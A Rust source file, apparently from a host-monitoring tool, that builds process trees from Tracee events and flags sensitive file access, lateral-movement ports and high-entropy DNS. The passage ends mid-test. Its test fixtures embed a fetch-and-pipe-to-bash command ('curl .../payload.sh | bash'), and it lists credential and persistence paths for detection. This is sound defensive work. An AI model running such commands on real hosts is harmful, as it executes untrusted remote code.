use std::collections::{HashMap, HashSet};
use std::net::IpAddr;

use anyhow::Result;
use serde::Serialize;
use serde_json::Value;

use crate::model::event::RawEvent;
use crate::model::process::ProcessNode;

#[derive(Debug, Default)]
pub struct ProcessTree {
    nodes: HashMap<String, ProcessNode>,
    pid_index: HashMap<i64, String>,
    children: HashMap<String, HashSet<String>>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RelatedFileEvent {
    pub pid: i64,
    pub event_name: String,
    pub file_path: String,
    pub flags: Option<String>,
    pub sensitive: bool,
    pub observed_at: i64,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RelatedNetworkEvent {
    pub pid: i64,
    pub event_name: String,
    pub remote_addr: Option<String>,
    pub remote_port: Option<i64>,
    pub external: bool,
    pub lateral_movement_hint: bool,
    pub observed_at: i64,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct RelatedDnsEvent {
    pub pid: i64,
    pub event_name: String,
    pub query: String,
    pub query_type: Option<String>,
    pub query_class: Option<String>,
    pub src: Option<String>,
    pub dst: Option<String>,
    pub src_port: Option<i64>,
    pub dst_port: Option<i64>,
    pub entropy: f64,
    pub high_entropy: bool,
    pub observed_at: i64,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct FilePropagationEvent {
    pub pid: i64,
    pub ppid: Option<i64>,
    pub event_name: String,
    pub process_name: Option<String>,
    pub exe_path: Option<String>,
    pub cmdline: Option<String>,
    pub flags: Option<String>,
    pub observed_at: i64,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct FilePropagationChain {
    pub path: String,
    pub write_events: Vec<FilePropagationEvent>,
    pub exec_events: Vec<FilePropagationEvent>,
}

impl ProcessTree {
    pub fn build(raw_events: &[RawEvent]) -> Result<Self> {
        let mut tree = Self::default();

        for event in raw_events {
            tree.handle_raw_event(event)?;
        }

        Ok(tree)
    }

    pub fn handle_raw_event(&mut self, event: &RawEvent) -> Result<()> {
        if event.source_kind != "tracee" {
            return Ok(());
        }

        match event.event_name.as_str() {
            "sched_process_exec" => self.handle_exec(event)?,
            "sched_process_fork" => self.handle_fork(event)?,
            "sched_process_exit" => self.handle_exit(event)?,
            _ => {}
        }

        Ok(())
    }

    pub fn get_by_pid(&self, pid: i64) -> Option<&ProcessNode> {
        self.pid_index
            .get(&pid)
            .and_then(|process_key| self.nodes.get(process_key))
    }

    pub fn ancestry_by_pid(&self, pid: i64, max_depth: usize) -> Vec<ProcessNode> {
        let mut lineage = Vec::new();
        let mut current = self.get_by_pid(pid).cloned();
        let mut visited = HashSet::new();
        let mut depth = 0usize;

        while let Some(node) = current {
            if !visited.insert(node.process_key.clone()) {
                break;
            }

            let parent_key = node.parent_process_key.clone();
            lineage.push(node);
            depth += 1;

            if depth >= max_depth {
                break;
            }

            current = parent_key.and_then(|key| self.nodes.get(&key).cloned());
        }

        lineage
    }

    pub fn descendants_by_pid(&self, pid: i64, max_nodes: usize) -> Vec<ProcessNode> {
        let Some(root) = self.get_by_pid(pid) else {
            return Vec::new();
        };

        let mut output = Vec::new();
        let mut stack = self.sorted_child_keys(&root.process_key);
        let mut visited = HashSet::new();
        visited.insert(root.process_key.clone());

        while let Some(process_key) = stack.pop() {
            if output.len() >= max_nodes {
                break;
            }

            if !visited.insert(process_key.clone()) {
                continue;
            }

            if let Some(node) = self.nodes.get(&process_key) {
                output.push(node.clone());
            }

            if self.children.contains_key(&process_key) {
                for child in self.sorted_child_keys(&process_key).into_iter().rev() {
                    stack.push(child);
                }
            }
        }

        output
    }

    fn handle_exec(&mut self, event: &RawEvent) -> Result<()> {
        let payload = parse_payload(event)?;
        let pid = get_i64(&payload, &["processId", "process_id"]).unwrap_or_default();
        let ppid = get_i64(&payload, &["parentProcessId", "parent_process_id"]);
        let comm = get_string(&payload, &["processName", "comm"]);
        let host =
            get_string(&payload, &["hostName", "host_name"]).or_else(|| event.hostname.clone());
        let uid = get_i64(&payload, &["userId", "uid"]);
        let exe_path = find_arg_value(&payload, "pathname");
        let cmdline = find_argv(&payload);
        let process_key = self
            .pid_index
            .get(&pid)
            .cloned()
            .or_else(|| event.process_key.clone())
            .unwrap_or_else(|| format!("tracee:{pid}:{}", event.observed_at));
        let parent_process_key = self.resolve_parent_key(ppid, pid, event.observed_at);

        self.pid_index.insert(pid, process_key.clone());

        let node = self
            .nodes
            .entry(process_key.clone())
            .or_insert(ProcessNode {
                process_key: process_key.clone(),
                pid,
                ppid,
                process_guid: None,
                parent_process_key: parent_process_key.clone(),
                exe_path: None,
                comm: None,
                cmdline: None,
                cwd: None,
                uid: None,
                gid: None,
                loginuid: None,
                session_id: None,
                start_time: event.observed_at,
                exit_time: None,
                namespace_pid: None,
                namespace_mnt: None,
                namespace_net: None,
                trust_score: 50,
                trust_reasons_json: None,
                flags_json: None,
            });

        node.pid = pid;
        node.ppid = ppid;
        node.parent_process_key = parent_process_key.clone();
        node.exe_path = exe_path;
        node.comm = comm;
        node.cmdline = cmdline;
        node.uid = uid;
        if node.trust_reasons_json.is_none() {
            node.trust_reasons_json = host.map(|hostname| format!(r#"["host:{}"]"#, hostname));
        }

        if let Some(parent_key) = parent_process_key
            && parent_key != process_key
        {
            self.children
                .entry(parent_key)
                .or_default()
                .insert(process_key);
        }

        Ok(())
    }

    fn handle_fork(&mut self, event: &RawEvent) -> Result<()> {
        let payload = parse_payload(event)?;
        let pid = get_i64(
            &payload,
            &[
                "childProcessId",
                "child_process_id",
                "processId",
                "process_id",
            ],
        )
        .unwrap_or_default();
        let ppid = get_i64(
            &payload,
            &[
                "processId",
                "process_id",
                "parentProcessId",
                "parent_process_id",
            ],
        );
        let process_key = self
            .pid_index
            .get(&pid)
            .cloned()
            .unwrap_or_else(|| format!("tracee:{pid}:{}", event.observed_at));
        let parent_process_key = self.resolve_parent_key(ppid, pid, event.observed_at);

        let node = self
            .nodes
            .entry(process_key.clone())
            .or_insert(ProcessNode {
                process_key: process_key.clone(),
                pid,
                ppid,
                process_guid: None,
                parent_process_key: parent_process_key.clone(),
                exe_path: None,
                comm: None,
                cmdline: None,
                cwd: None,
                uid: None,
                gid: None,
                loginuid: None,
                session_id: None,
                start_time: event.observed_at,
                exit_time: None,
                namespace_pid: None,
                namespace_mnt: None,
                namespace_net: None,
                trust_score: 50,
                trust_reasons_json: None,
                flags_json: None,
            });

        node.ppid = ppid;
        node.parent_process_key = parent_process_key.clone();
        self.pid_index.insert(pid, process_key.clone());

        if let Some(parent_key) = parent_process_key
            && parent_key != process_key
        {
            self.children
                .entry(parent_key)
                .or_default()
                .insert(process_key);
        }

        Ok(())
    }

    fn handle_exit(&mut self, event: &RawEvent) -> Result<()> {
        let payload = parse_payload(event)?;
        let pid = get_i64(&payload, &["processId", "process_id"]).unwrap_or_default();
        if let Some(process_key) = self.pid_index.get(&pid)
            && let Some(node) = self.nodes.get_mut(process_key)
        {
            node.exit_time = Some(event.observed_at);
        }
        Ok(())
    }

    fn resolve_parent_key(
        &self,
        ppid: Option<i64>,
        child_pid: i64,
        observed_at: i64,
    ) -> Option<String> {
        let parent_pid = ppid?;
        if parent_pid == child_pid {
            return None;
        }

        Some(
            self.pid_index
                .get(&parent_pid)
                .cloned()
                .unwrap_or_else(|| format!("tracee:{parent_pid}:{observed_at}")),
        )
    }

    fn sorted_child_keys(&self, process_key: &str) -> Vec<String> {
        let mut keys = self
            .children
            .get(process_key)
            .map(|children| children.iter().cloned().collect::<Vec<_>>())
            .unwrap_or_default();

        keys.sort_by_key(|key| {
            self.nodes
                .get(key)
                .map(|node| (node.start_time, node.pid, key.clone()))
                .unwrap_or((i64::MAX, i64::MAX, key.clone()))
        });

        keys
    }
}

pub fn file_events_for_pid(raw_events: &[RawEvent], pid: i64) -> Vec<RelatedFileEvent> {
    file_events_for_pids(raw_events, &[pid], None, None)
}

pub fn file_events_for_pids(
    raw_events: &[RawEvent],
    pids: &[i64],
    window_start: Option<i64>,
    window_end: Option<i64>,
) -> Vec<RelatedFileEvent> {
    let pid_set: HashSet<i64> = pids.iter().copied().collect();

    raw_events
        .iter()
        .filter_map(|event| {
            if event.source_kind != "tracee" || event.event_name != "security_file_open" {
                return None;
            }

            if let Some(start) = window_start
                && event.observed_at < start
            {
                return None;
            }
            if let Some(end) = window_end
                && event.observed_at > end
            {
                return None;
            }

            let payload = parse_payload(event).ok()?;
            let event_pid = get_i64(&payload, &["processId", "process_id"])?;
            if !pid_set.contains(&event_pid) {
                return None;
            }

            let file_path = find_arg_value(&payload, "pathname")?;
            let flags = find_arg_value(&payload, "flags");

            Some(RelatedFileEvent {
                pid: event_pid,
                event_name: event.event_name.clone(),
                sensitive: is_sensitive_path(&file_path),
                file_path,
                flags,
                observed_at: event.observed_at,
            })
        })
        .collect()
}

pub fn network_events_for_target(
    raw_events: &[RawEvent],
    target: &str,
) -> Vec<RelatedNetworkEvent> {
    raw_events
        .iter()
        .filter_map(|event| {
            if event.source_kind != "tracee" || !is_network_connect_event(&event.event_name) {
                return None;
            }

            let payload = parse_payload(event).ok()?;
            let remote_addr = find_remote_addr(&payload);
            let remote_port = find_remote_port(&payload);
            let event_pid = get_i64(&payload, &["processId", "process_id"])?;

            let matches = remote_addr.as_deref() == Some(target)
                || remote_port
                    .map(|port| {
                        format!("{}:{port}", remote_addr.as_deref().unwrap_or("-")) == target
                    })
                    .unwrap_or(false);
            if !matches {
                return None;
            }

            Some(RelatedNetworkEvent {
                pid: event_pid,
                event_name: event.event_name.clone(),
                external: remote_addr.as_deref().is_some_and(is_external_ip),
                lateral_movement_hint: is_lateral_movement_hint(
                    remote_addr.as_deref(),
                    remote_port,
                ),
                remote_addr,
                remote_port,
                observed_at: event.observed_at,
            })
        })
        .collect()
}

pub fn file_events_for_path(raw_events: &[RawEvent], path: &str) -> Vec<RelatedFileEvent> {
    raw_events
        .iter()
        .filter_map(|event| {
            if event.source_kind != "tracee" || event.event_name != "security_file_open" {
                return None;
            }

            let payload = parse_payload(event).ok()?;
            let event_pid = get_i64(&payload, &["processId", "process_id"])?;
            let file_path = find_arg_value(&payload, "pathname")?;
            if file_path != path && !file_path.contains(path) {
                return None;
            }

            let flags = find_arg_value(&payload, "flags");
            Some(RelatedFileEvent {
                pid: event_pid,
                event_name: event.event_name.clone(),
                sensitive: is_sensitive_path(&file_path),
                file_path,
                flags,
                observed_at: event.observed_at,
            })
        })
        .collect()
}

pub fn file_propagation_for_path(raw_events: &[RawEvent], path: &str) -> FilePropagationChain {
    let mut write_events = Vec::new();
    let mut exec_events = Vec::new();

    for event in raw_events {
        if event.source_kind != "tracee" {
            continue;
        }

        let Ok(payload) = parse_payload(event) else {
            continue;
        };

        match event.event_name.as_str() {
            "security_file_open" => {
                let file_path = find_arg_value(&payload, "pathname")
                    .or_else(|| find_arg_value(&payload, "syscall_pathname"));
                let flags = find_arg_value(&payload, "flags");
                if file_path.as_deref() == Some(path) && has_write_intent(flags.as_deref()) {
                    write_events.push(FilePropagationEvent {
                        pid: get_i64(&payload, &["processId", "process_id"]).unwrap_or_default(),
                        ppid: get_i64(&payload, &["parentProcessId", "parent_process_id"]),
                        event_name: event.event_name.clone(),
                        process_name: get_string(&payload, &["processName", "comm"]),
                        exe_path: None,
                        cmdline: find_argv(&payload),
                        flags,
                        observed_at: event.observed_at,
                    });
                }
            }
            "sched_process_exec" => {
                let exe_path = find_arg_value(&payload, "pathname");
                let argv = find_argv(&payload);
                let argv0_matches = argv
                    .as_deref()
                    .is_some_and(|value| value.split_whitespace().next() == Some(path));
                if exe_path.as_deref() == Some(path) || argv0_matches {
                    exec_events.push(FilePropagationEvent {
                        pid: get_i64(&payload, &["processId", "process_id"]).unwrap_or_default(),
                        ppid: get_i64(&payload, &["parentProcessId", "parent_process_id"]),
                        event_name: event.event_name.clone(),
                        process_name: get_string(&payload, &["processName", "comm"]),
                        exe_path,
                        cmdline: argv,
                        flags: None,
                        observed_at: event.observed_at,
                    });
                }
            }
            _ => {}
        }
    }

    write_events.sort_by_key(|event| event.observed_at);
    exec_events.sort_by_key(|event| event.observed_at);

    FilePropagationChain {
        path: path.to_string(),
        write_events,
        exec_events,
    }
}

pub fn network_events_for_pid(raw_events: &[RawEvent], pid: i64) -> Vec<RelatedNetworkEvent> {
    network_events_for_pids(raw_events, &[pid], None, None)
}

pub fn dns_events_for_pid(raw_events: &[RawEvent], pid: i64) -> Vec<RelatedDnsEvent> {
    dns_events_for_pids(raw_events, &[pid], None, None)
}

pub fn dns_events_for_pids(
    raw_events: &[RawEvent],
    pids: &[i64],
    window_start: Option<i64>,
    window_end: Option<i64>,
) -> Vec<RelatedDnsEvent> {
    let pid_set: HashSet<i64> = pids.iter().copied().collect();
    let mut events = Vec::new();

    for event in raw_events {
        if event.source_kind != "tracee" || event.event_name != "net_packet_dns_request" {
            continue;
        }

        if let Some(start) = window_start
            && event.observed_at < start
        {
            continue;
        }
        if let Some(end) = window_end
            && event.observed_at > end
        {
            continue;
        }

        let Ok(payload) = parse_payload(event) else {
            continue;
        };
        let Some(event_pid) = get_i64(&payload, &["processId", "process_id"]) else {
            continue;
        };
        if !pid_set.contains(&event_pid) {
            continue;
        }

        let src = find_metadata_string(&payload, "src").or_else(|| find_arg_value(&payload, "src"));
        let dst = find_metadata_string(&payload, "dst").or_else(|| find_arg_value(&payload, "dst"));
        let src_port =
            find_metadata_i64(&payload, "src_port").or_else(|| find_arg_i64(&payload, "src_port"));
        let dst_port =
            find_metadata_i64(&payload, "dst_port").or_else(|| find_arg_i64(&payload, "dst_port"));

        for question in find_dns_questions(&payload) {
            let entropy = shannon_entropy(&question.query);
            let high_entropy = entropy >= 4.0 && question.query.len() >= 20;
            events.push(RelatedDnsEvent {
                pid: event_pid,
                event_name: event.event_name.clone(),
                query: question.query,
                query_type: question.query_type,
                query_class: question.query_class,
                src: src.clone(),
                dst: dst.clone(),
                src_port,
                dst_port,
                entropy,
                high_entropy,
                observed_at: event.observed_at,
            });
        }
    }

    events.sort_by_key(|event| event.observed_at);
    events
}

pub fn network_events_for_pids(
    raw_events: &[RawEvent],
    pids: &[i64],
    window_start: Option<i64>,
    window_end: Option<i64>,
) -> Vec<RelatedNetworkEvent> {
    let pid_set: HashSet<i64> = pids.iter().copied().collect();

    raw_events
        .iter()
        .filter_map(|event| {
            if event.source_kind != "tracee" || !is_network_connect_event(&event.event_name) {
                return None;
            }

            if let Some(start) = window_start
                && event.observed_at < start
            {
                return None;
            }
            if let Some(end) = window_end
                && event.observed_at > end
            {
                return None;
            }

            let payload = parse_payload(event).ok()?;
            let event_pid = get_i64(&payload, &["processId", "process_id"])?;
            if !pid_set.contains(&event_pid) {
                return None;
            }

            let remote_addr = find_remote_addr(&payload);
            let remote_port = find_remote_port(&payload);
            Some(RelatedNetworkEvent {
                pid: event_pid,
                event_name: event.event_name.clone(),
                external: remote_addr.as_deref().is_some_and(is_external_ip),
                lateral_movement_hint: is_lateral_movement_hint(
                    remote_addr.as_deref(),
                    remote_port,
                ),
                remote_addr,
                remote_port,
                observed_at: event.observed_at,
            })
        })
        .collect()
}

fn parse_payload(event: &RawEvent) -> Result<Value> {
    let payload = event
        .payload_json
        .as_ref()
        .map(|json| serde_json::from_str::<Value>(json))
        .transpose()?
        .unwrap_or(Value::Null);
    Ok(payload)
}

fn get_i64(value: &Value, keys: &[&str]) -> Option<i64> {
    let object = value.as_object()?;
    keys.iter().find_map(|key| {
        object.get(*key).and_then(|entry| match entry {
            Value::Number(n) => n.as_i64(),
            Value::String(s) => s.parse::<i64>().ok(),
            _ => None,
        })
    })
}

fn get_string(value: &Value, keys: &[&str]) -> Option<String> {
    let object = value.as_object()?;
    keys.iter().find_map(|key| {
        object.get(*key).and_then(|entry| match entry {
            Value::String(s) => Some(s.to_string()),
            Value::Number(n) => Some(n.to_string()),
            _ => None,
        })
    })
}

fn find_arg_value(value: &Value, arg_name: &str) -> Option<String> {
    let args = value.get("args")?.as_array()?;
    args.iter().find_map(|arg| {
        let object = arg.as_object()?;
        let name = object.get("name")?.as_str()?;
        if name != arg_name {
            return None;
        }
        match object.get("value")? {
            Value::String(s) => Some(s.to_string()),
            Value::Number(n) => Some(n.to_string()),
            _ => None,
        }
    })
}

fn find_argv(value: &Value) -> Option<String> {
    let args = value.get("args")?.as_array()?;
    args.iter().find_map(|arg| {
        let object = arg.as_object()?;
        let name = object.get("name")?.as_str()?;
        if name != "argv" {
            return None;
        }
        let array = object.get("value")?.as_array()?;
        Some(
            array
                .iter()
                .filter_map(|item| item.as_str().map(str::to_string))
                .collect::<Vec<_>>()
                .join(" "),
        )
    })
}

fn find_arg_i64(value: &Value, arg_name: &str) -> Option<i64> {
    let args = value.get("args")?.as_array()?;
    args.iter().find_map(|arg| {
        let object = arg.as_object()?;
        let name = object.get("name")?.as_str()?;
        if name != arg_name {
            return None;
        }
        match object.get("value")? {
            Value::Number(n) => n.as_i64(),
            Value::String(s) => s.parse::<i64>().ok(),
            _ => None,
        }
    })
}

fn find_arg_json<'a>(value: &'a Value, arg_name: &str) -> Option<&'a Value> {
    let args = value.get("args")?.as_array()?;
    args.iter().find_map(|arg| {
        let object = arg.as_object()?;
        let name = object.get("name")?.as_str()?;
        if name != arg_name {
            return None;
        }
        object.get("value")
    })
}

fn is_network_connect_event(event_name: &str) -> bool {
    matches!(
        event_name,
        "tcp_connect" | "net_tcp_connect" | "security_socket_connect" | "connect"
    )
}

fn find_remote_addr(value: &Value) -> Option<String> {
    find_arg_value(value, "remote_addr")
        .or_else(|| find_arg_value(value, "dst_ip"))
        .or_else(|| find_arg_value(value, "dst"))
        .or_else(|| find_metadata_string(value, "dst"))
        .or_else(|| find_sockaddr_member(value, "remote_addr", &["ip", "sin_addr", "sin6_addr"]))
}

fn find_metadata_string(value: &Value, key: &str) -> Option<String> {
    let metadata = find_arg_json(value, "metadata")?.as_object()?;
    metadata.get(key).and_then(|entry| match entry {
        Value::String(s) => Some(s.to_string()),
        Value::Number(n) => Some(n.to_string()),
        _ => None,
    })
}

fn find_metadata_i64(value: &Value, key: &str) -> Option<i64> {
    let metadata = find_arg_json(value, "metadata")?.as_object()?;
    metadata.get(key).and_then(|entry| match entry {
        Value::Number(n) => n.as_i64(),
        Value::String(s) => s.parse::<i64>().ok(),
        _ => None,
    })
}

#[derive(Debug)]
struct DnsQuestion {
    query: String,
    query_type: Option<String>,
    query_class: Option<String>,
}

fn find_dns_questions(value: &Value) -> Vec<DnsQuestion> {
    let Some(raw_questions) = find_arg_json(value, "dns_questions").and_then(Value::as_array)
    else {
        return Vec::new();
    };

    raw_questions
        .iter()
        .filter_map(|item| {
            let object = item.as_object()?;
            let query = object
                .get("query")
                .or_else(|| object.get("name"))
                .or_else(|| object.get("domain"))
                .and_then(Value::as_str)?
                .to_string();
            let query_type = object
                .get("query_type")
                .or_else(|| object.get("type"))
                .and_then(Value::as_str)
                .map(str::to_string);
            let query_class = object
                .get("query_class")
                .or_else(|| object.get("class"))
                .and_then(Value::as_str)
                .map(str::to_string);
            Some(DnsQuestion {
                query,
                query_type,
                query_class,
            })
        })
        .collect()
}

fn shannon_entropy(input: &str) -> f64 {
    if input.is_empty() {
        return 0.0;
    }

    let mut counts: HashMap<char, usize> = HashMap::new();
    for ch in input.chars() {
        *counts.entry(ch).or_default() += 1;
    }

    let len = input.chars().count() as f64;
    counts
        .values()
        .map(|count| {
            let p = *count as f64 / len;
            -(p * p.log2())
        })
        .sum()
}

fn find_remote_port(value: &Value) -> Option<i64> {
    find_arg_i64(value, "remote_port")
        .or_else(|| find_arg_i64(value, "dst_port"))
        .or_else(|| {
            find_sockaddr_member(value, "remote_addr", &["port", "sin_port"])
                .and_then(|s| s.parse().ok())
        })
}

fn find_sockaddr_member(value: &Value, arg_name: &str, keys: &[&str]) -> Option<String> {
    let args = value.get("args")?.as_array()?;
    let sockaddr = args.iter().find_map(|arg| {
        let object = arg.as_object()?;
        let name = object.get("name")?.as_str()?;
        if name != arg_name {
            return None;
        }
        object.get("value")?.as_object().cloned()
    })?;

    keys.iter().find_map(|key| {
        sockaddr.get(*key).and_then(|entry| match entry {
            Value::String(s) => Some(s.to_string()),
            Value::Number(n) => Some(n.to_string()),
            _ => None,
        })
    })
}

fn is_sensitive_path(path: &str) -> bool {
    const SENSITIVE_PATHS: &[&str] = &[
        "/etc/shadow",
        "/etc/passwd",
        "/root/.ssh",
        "/root/.ssh/id_rsa",
        "authorized_keys",
        "/etc/crontab",
        "/etc/cron.d",
        "/etc/cron.daily",
        "/etc/cron.hourly",
        "/etc/cron.weekly",
        "/etc/cron.monthly",
        "/var/spool/cron",
        "/etc/systemd/system",
    ];

    SENSITIVE_PATHS
        .iter()
        .any(|candidate| path.contains(candidate))
}

fn is_external_ip(ip: &str) -> bool {
    match ip.parse::<IpAddr>() {
        Ok(IpAddr::V4(addr)) => {
            !(addr.is_private()
                || addr.is_loopback()
                || addr.is_link_local()
                || addr.is_multicast()
                || addr.is_unspecified())
        }
        Ok(IpAddr::V6(addr)) => {
            !(addr.is_loopback()
                || addr.is_multicast()
                || addr.is_unspecified()
                || addr.is_unique_local()
                || addr.is_unicast_link_local())
        }
        Err(_) => false,
    }
}

fn is_lateral_movement_hint(remote_addr: Option<&str>, remote_port: Option<i64>) -> bool {
    let Some(ip) = remote_addr else {
        return false;
    };
    let Some(port) = remote_port else {
        return false;
    };

    !is_external_ip(ip) && matches!(port, 22 | 445 | 3389 | 139 | 5985 | 5986)
}

fn has_write_intent(flags: Option<&str>) -> bool {
    flags.is_some_and(|value| {
        value.contains("O_WRONLY")
            || value.contains("O_RDWR")
            || value.contains("O_CREAT")
            || value.contains("O_TRUNC")
            || value.contains("O_APPEND")
    })
}

#[cfg(test)]
mod tests {
    use crate::model::event::RawEvent;

    use super::{
        ProcessTree, RelatedNetworkEvent, dns_events_for_pid, file_events_for_pid,
        file_propagation_for_path, network_events_for_pid,
    };

    #[test]
    fn build_tree_from_exec_event() {
        let event = RawEvent {
            id: "tracee:1718611200:sched_process_exec:4242:1".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611200,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611200,"eventName":"sched_process_exec","hostName":"blue","processId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/usr/bin/bash"},{"name":"argv","value":["bash","-c","curl http://10.0.0.5/payload.sh | bash"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611200,
        };

        let tree = ProcessTree::build(&[event]).expect("tree should build");
        let node = tree.get_by_pid(4242).expect("pid 4242 should exist");

        assert_eq!(node.pid, 4242);
        assert_eq!(node.ppid, Some(4230));
        assert_eq!(node.exe_path.as_deref(), Some("/usr/bin/bash"));
        assert_eq!(
            node.cmdline.as_deref(),
            Some("bash -c curl http://10.0.0.5/payload.sh | bash")
        );
    }

    #[test]
    fn self_parent_event_does_not_create_recursive_lineage() {
        let event = RawEvent {
            id: "tracee:1718611200:sched_process_exec:4242:1".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611200,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611200,"eventName":"sched_process_exec","hostName":"blue","processId":4242,"parentProcessId":4242,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/usr/bin/bash"},{"name":"argv","value":["bash","-lc","id"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611200,
        };

        let tree = ProcessTree::build(&[event]).expect("tree should build");
        let node = tree.get_by_pid(4242).expect("pid 4242 should exist");

        assert_eq!(node.ppid, Some(4242));
        assert!(node.parent_process_key.is_none());

        let ancestry = tree.ancestry_by_pid(4242, 16);
        assert_eq!(ancestry.len(), 1);
        assert_eq!(ancestry[0].pid, 4242);

        let descendants = tree.descendants_by_pid(4242, 16);
        assert!(descendants.is_empty());
    }

    #[test]
    fn build_tree_with_parent_child_and_exit() {
        let parent_exec = RawEvent {
            id: "tracee:1718611100:sched_process_exec:4230:1".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611100,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4230:1718611100".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611100,"eventName":"sched_process_exec","hostName":"blue","processId":4230,"parentProcessId":1,"userId":0,"processName":"sshd","args":[{"name":"pathname","value":"/usr/sbin/sshd"},{"name":"argv","value":["sshd","-D"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611100,
        };

        let child_fork = RawEvent {
            id: "tracee:1718611199:sched_process_fork:4242:2".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_fork".to_string(),
            observed_at: 1718611199,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611199".to_string()),
            severity: Some(3),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611199,"eventName":"sched_process_fork","hostName":"blue","processId":4230,"childProcessId":4242}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611199,
        };

        let child_exec = RawEvent {
            id: "tracee:1718611200:sched_process_exec:4242:3".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611200,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611200,"eventName":"sched_process_exec","hostName":"blue","processId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/usr/bin/bash"},{"name":"argv","value":["bash","-c","id"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611200,
        };

        let child_exit = RawEvent {
            id: "tracee:1718611300:sched_process_exit:4242:4".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exit".to_string(),
            observed_at: 1718611300,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(3),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611300,"eventName":"sched_process_exit","hostName":"blue","processId":4242}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611300,
        };

        let tree = ProcessTree::build(&[parent_exec, child_fork, child_exec, child_exit])
            .expect("tree should build");

        let ancestry = tree.ancestry_by_pid(4242, 8);
        assert_eq!(ancestry.len(), 2);
        assert_eq!(ancestry[0].pid, 4242);
        assert_eq!(ancestry[1].pid, 4230);
        assert_eq!(ancestry[0].exit_time, Some(1718611300));

        let descendants = tree.descendants_by_pid(4230, 8);
        assert!(descendants.iter().any(|node| node.pid == 4242));
        assert!(!descendants.iter().any(|node| node.pid == 4230));
    }

    #[test]
    fn fork_event_uses_child_pid_key_and_exec_reuses_it() {
        let parent_exec = RawEvent {
            id: "tracee:1718611100:sched_process_exec:4230:1".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611100,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4230:1718611100".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611100,"eventName":"sched_process_exec","hostName":"blue","processId":4230,"parentProcessId":1,"userId":0,"processName":"sshd","args":[{"name":"pathname","value":"/usr/sbin/sshd"},{"name":"argv","value":["sshd","-D"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611100,
        };
        let child_fork = RawEvent {
            id: "tracee:1718611199:sched_process_fork:4242:2".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_fork".to_string(),
            observed_at: 1718611199,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4230:1718611199".to_string()),
            severity: Some(3),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611199,"eventName":"sched_process_fork","hostName":"blue","processId":4230,"childProcessId":4242}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611199,
        };
        let child_exec = RawEvent {
            id: "tracee:1718611200:sched_process_exec:4242:3".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611200,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611200,"eventName":"sched_process_exec","hostName":"blue","processId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/usr/bin/bash"},{"name":"argv","value":["bash","-lc","curl http://10.0.0.5/payload.sh | bash"]}]}"#.to_string()),
